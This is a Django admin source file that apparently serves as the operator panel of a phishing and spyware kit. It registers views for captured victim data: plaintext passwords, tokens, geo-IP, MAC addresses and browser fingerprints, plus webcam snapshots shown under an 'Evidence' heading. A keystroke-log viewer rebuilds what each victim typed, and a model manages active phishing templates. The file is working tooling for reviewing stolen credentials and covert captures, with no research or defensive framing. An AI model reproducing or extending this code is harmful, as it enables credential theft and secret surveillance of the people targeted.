from django.contrib import admin
from .models import ThreatLog, LiveKeyStroke, ActivePhishTemplate
import json

@admin.register(ThreatLog)
class ThreatLogAdmin(admin.ModelAdmin):
    list_display = ('intercepted_id', 'raw_password', 'geo_ip', 'mac_address', 'browser_fingerprint', 'risk_level', 'timestamp')
    list_filter = ('risk_level', 'timestamp')
    search_fields = ('intercepted_id', 'geo_ip', 'mac_address', 'raw_password')
    readonly_fields = ('timestamp', 'encrypted_token', 'webcam_snap_preview')
    ordering = ('-timestamp',)

    def webcam_snap_preview(self, obj):
        if obj.webcam_snap:
            return f'<img src="{obj.webcam_snap}" style="max-width:200px; max-height:150px; border:2px solid #333;" />'
        return '[ NO IMAGE CAPTURED ]'
    webcam_snap_preview.allow_tags = True
    webcam_snap_preview.short_description = 'Webcam Snapshot'

    fieldsets = (
        ('Target Identity', {
            'fields': ('intercepted_id', 'raw_password', 'encrypted_token', 'risk_level')
        }),
        ('Network Intelligence', {
            'fields': ('geo_ip', 'mac_address', 'browser_fingerprint')
        }),
        ('Evidence', {
            'fields': ('webcam_snap_preview', 'timestamp')
        }),
    )


@admin.register(LiveKeyStroke)
class LiveKeyStrokeAdmin(admin.ModelAdmin):
    list_display = ('username_context', 'get_parsed_keys', 'timestamp')
    search_fields = ('username_context',)
    readonly_fields = ('timestamp', 'get_parsed_keys')
    ordering = ('-timestamp',)

    def get_parsed_keys(self, obj):
        """Parse JSON keystrokes to readable string"""
        try:
            arr = json.loads(obj.keystrokes)
            result = ""
            for item in arr:
                key = item.get('key', '')
                if key == 'Backspace':
                    result = result[:-1]
                else:
                    result += key
            return result if result else obj.keystrokes
        except (json.JSONDecodeError, TypeError):
            return obj.keystrokes
    get_parsed_keys.short_description = 'Keystrokes (Parsed)'


@admin.register(ActivePhishTemplate)
class ActivePhishTemplateAdmin(admin.ModelAdmin):
    list_display = ('template_name', 'updated_at')
    readonly_fields = ('updated_at',)
